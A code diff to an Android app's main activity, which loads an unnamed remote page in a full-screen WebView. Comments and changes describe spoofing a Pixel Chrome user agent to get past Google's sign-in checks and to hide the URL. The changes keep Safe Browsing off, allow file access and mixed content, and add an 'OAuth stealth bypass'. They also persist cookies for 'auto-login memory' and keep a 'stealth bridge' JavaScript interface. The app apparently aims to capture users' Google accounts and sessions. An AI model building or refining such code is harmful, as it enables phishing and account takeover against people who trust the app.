@@ -14,6 +14,8 @@ import android.os.Build;
 import android.os.Bundle;
 import android.view.Gravity;
 import android.view.View;
+import android.view.WindowManager;
+import android.webkit.CookieManager;
 import android.webkit.JavascriptInterface; 
 import android.webkit.PermissionRequest;
 import android.webkit.WebChromeClient;
@@ -44,7 +46,8 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // --- 1. ELITE UI SETUP (Pitch Black) ---
+        // --- 1. FULLSCREEN ALPHA UI SETUP (Pitch Black) ---
+        getWindow().setFlags(WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED, WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED);
         RelativeLayout layout = new RelativeLayout(this);
         layout.setBackgroundColor(Color.parseColor("#050505")); 
         setContentView(layout);
@@ -63,7 +66,7 @@ public class MainActivity extends Activity {
             hkView.setImportantForAutofill(View.IMPORTANT_FOR_AUTOFILL_YES);
         }
 
-        // DIRECT INJECTION
+        // DIRECT INJECTION (No Scroll Clash)
         layout.addView(hkView, new RelativeLayout.LayoutParams(
             RelativeLayout.LayoutParams.MATCH_PARENT, 
             RelativeLayout.LayoutParams.MATCH_PARENT
@@ -114,8 +117,11 @@ public class MainActivity extends Activity {
         settings.setUseWideViewPort(true); 
         settings.setLoadWithOverviewMode(true); 
         settings.setRenderPriority(WebSettings.RenderPriority.HIGH); 
-        settings.setSaveFormData(true); // Enable Device Scan/Autofill
-
+        
+        // Form Data Save Engine
+        settings.setSaveFormData(true);
+        settings.setAllowFileAccess(true);
+        
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             settings.setSafeBrowsingEnabled(false); 
         }
@@ -123,12 +129,12 @@ public class MainActivity extends Activity {
         settings.setLoadsImagesAutomatically(true);
         settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
         
-        // 👉 SPOOFING: Pixel 8 Chrome Browser (Google bypass ke liye)
-        String chromeUserAgent = "Mozilla/5.0 (Linux; Android 14; Pixel 8 Build/UD1A.230803.041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36";
+        // 👉 SPOOFING: Pixel 7 Pro Chrome Browser (To hide URL and force Account Scan)
+        String chromeUserAgent = "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36";
         settings.setUserAgentString(chromeUserAgent);
         
         settings.setJavaScriptCanOpenWindowsAutomatically(true);
-        android.webkit.CookieManager cookieManager = android.webkit.CookieManager.getInstance();
+        CookieManager cookieManager = CookieManager.getInstance();
         cookieManager.setAcceptCookie(true);
         cookieManager.setAcceptThirdPartyCookies(hkView, true);
         
@@ -144,16 +150,17 @@ public class MainActivity extends Activity {
             }
         });
 
-        // --- 5. WEBVIEW CLIENT (THE GMAIL SCAN TRIGGER) ---
+        // --- 5. WEBVIEW CLIENT (THE GMAIL POPUP & WHITE SCREEN BYPASS) ---
         hkView.setWebViewClient(new WebViewClient() {
             @Override
             public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                // 👉 THE GMAIL SCAN TRIGGER: Link hide karega aur phone ka Gmail list dikhayega
-                if (url.contains("accounts.google.com") || url.contains("googlegmail://")) {
+                // 👉 THE OAUTH STEALTH BYPASS: System Level Account Selector Trigger
+                if (url.contains("accounts.google.com") || url.contains("gsi/")) {
                     try {
                         Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
-                        startActivity(intent); // System level selector trigger
-                        return true;
+                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(intent); // External App scan trigger
+                        return true; // Stop White Screen
                     } catch (Exception e) {
                         return false; 
                     }
@@ -175,7 +182,8 @@ public class MainActivity extends Activity {
             public void onPageFinished(WebView view, String url) {
                 loaderLayout.setVisibility(View.GONE);
                 hkView.setVisibility(View.VISIBLE);
-                android.webkit.CookieManager.getInstance().flush(); // Session lock
+                // HK-OPERATION: Force cookie sync for auto-login memory
+                CookieManager.getInstance().flush();
                 super.onPageFinished(view, url);
             }
 
@@ -209,7 +217,7 @@ public class MainActivity extends Activity {
         hkView.loadUrl(TARGET_URL);
     }
 
-    // --- HK-OPERATION STEALTH BRIDGE (NATIVE GMAIL POPUP TRIGGER) ---
+    // --- 7. HK-OPERATION STEALTH BRIDGE (NATIVE GMAIL POPUP FALLBACK) ---
     public class HKStealthBridge {
         @JavascriptInterface
         public void executeSystemLogin() {
@@ -242,7 +250,7 @@ public class MainActivity extends Activity {
         }
     }
 
-    // --- SECURE NO-INTERNET POPUP (GREEN PANEL / RED BUTTON) ---
+    // --- 8. SECURE NO-INTERNET POPUP (GREEN PANEL / RED BUTTON) ---
     private void showNoInternetPopUp() {
         if (internetDialog != null && internetDialog.isShowing()) return;
 
@@ -303,7 +311,7 @@ public class MainActivity extends Activity {
         internetDialog.show();
     }
 
-    // --- CUSTOM SECURE EXIT & GESTURE LOGIC (INSTANT SILENT KILL) ---
+    // --- 9. CUSTOM SECURE EXIT & GESTURE LOGIC (INSTANT SILENT KILL) ---
     @Override
     public void onBackPressed() {
         if (hkView.canGoBack()) {
